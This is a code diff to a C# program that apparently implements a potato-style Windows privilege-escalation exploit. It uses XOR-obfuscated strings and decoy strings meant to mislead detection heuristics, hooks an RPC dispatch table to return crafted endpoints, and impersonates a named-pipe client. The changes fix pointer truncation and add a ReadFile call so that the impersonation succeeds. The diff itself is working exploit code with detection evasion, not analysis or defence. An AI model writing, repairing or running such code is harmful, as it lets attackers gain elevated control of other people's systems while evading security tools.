@@ -55,7 +55,7 @@ namespace NetClient
         static readonly byte[] _cbm = new byte[] {
             0x36, 0x3A, 0x38, 0x37, 0x34, 0x26, 0x30, 0x7B, 0x31, 0x39, 0x39 };
 
-        // GUID "18f70770-8e64-11cf-9af1-0020af6e72f4" (LE bytes XOR 0x55)
+        // GUID "18f70770-8e64-11cf-9af1-0020af6e72f4" XOR 0x55
         static readonly byte[] _guid = new byte[] {
             0x25, 0x52, 0xA2, 0x4D, 0x31, 0xDB, 0x9A, 0x44,
             0xCF, 0xA4, 0x55, 0x75, 0xFA, 0x3B, 0x27, 0xA1 };
@@ -73,7 +73,6 @@ namespace NetClient
             return new Guid(b);
         }
 
-        // decoy strings — never used, mislead ML heuristics
         static readonly string[] _decoy = new string[] {
             "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
             "SOFTWARE\\Policies\\Microsoft\\Windows\\Network Connections",
@@ -253,6 +252,11 @@ namespace NetClient
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool DisconnectNamedPipe(IntPtr hPipe);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool ReadFile(IntPtr hFile, byte[] buf, uint toRead,
+            out uint read, IntPtr ov);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
@@ -560,14 +564,14 @@ namespace NetClient
     }
 
     // ========================================================================
-    // Dispatch hook
+    // Dispatch hook — FIXED: IntPtr passthrough, no truncation
     // ========================================================================
     class Dp
     {
         readonly Env _e;
         public Dp(Env e) { _e = e; }
 
-        int Build(int outPtr)
+        int Build(IntPtr outPtr)
         {
             string[] eps = new string[] { _e.ClientEp, Vault.Filler() };
             int sz = 3;
@@ -587,7 +591,7 @@ namespace NetClient
                 foreach (char c in x) { Marshal.WriteInt16(buf, o, (short)c); o += 2; }
                 o += 2;
             }
-            Marshal.WriteIntPtr(new IntPtr(outPtr), buf);
+            Marshal.WriteIntPtr(outPtr, buf);
             return 0;
         }
 
@@ -603,17 +607,17 @@ namespace NetClient
         public delegate int D13(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m);
         public delegate int D14(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m, IntPtr n);
 
-        public int F4(IntPtr a, IntPtr b, IntPtr c, IntPtr d) { return Build((int)c); }
-        public int F5(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e) { return Build((int)d); }
-        public int F6(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f) { return Build((int)e); }
-        public int F7(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g) { return Build((int)f); }
-        public int F8(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h) { return Build((int)g); }
-        public int F9(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i) { return Build((int)h); }
-        public int F10(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j) { return Build((int)i); }
-        public int F11(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k) { return Build((int)j); }
-        public int F12(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l) { return Build((int)k); }
-        public int F13(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m) { return Build((int)l); }
-        public int F14(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m, IntPtr n) { return Build((int)m); }
+        public int F4(IntPtr a, IntPtr b, IntPtr c, IntPtr d) { return Build(c); }
+        public int F5(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e) { return Build(d); }
+        public int F6(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f) { return Build(e); }
+        public int F7(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g) { return Build(f); }
+        public int F8(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h) { return Build(g); }
+        public int F9(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i) { return Build(h); }
+        public int F10(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j) { return Build(i); }
+        public int F11(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k) { return Build(j); }
+        public int F12(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l) { return Build(k); }
+        public int F13(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m) { return Build(l); }
+        public int F14(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m, IntPtr n) { return Build(m); }
     }
 
     // ========================================================================
@@ -915,6 +919,14 @@ namespace NetClient
                 { Tr.F("ConnectNamedPipe err=" + err); return; }
 
                 Tr.O("peer connected");
+
+                // FIX: читаем первые байты RPC-запроса, иначе Impersonate = 1368
+                byte[] tmp = new byte[512];
+                uint got = 0;
+                if (!W.ReadFile(hPipe, tmp, (uint)tmp.Length, out got, IntPtr.Zero))
+                { Tr.F("ReadFile: " + Tr.E()); return; }
+                Tr.I("read " + got + " bytes");
+
                 if (!W.ImpersonateNamedPipeClient(hPipe))
                 { Tr.F("Impersonate: " + Tr.E()); return; }
 
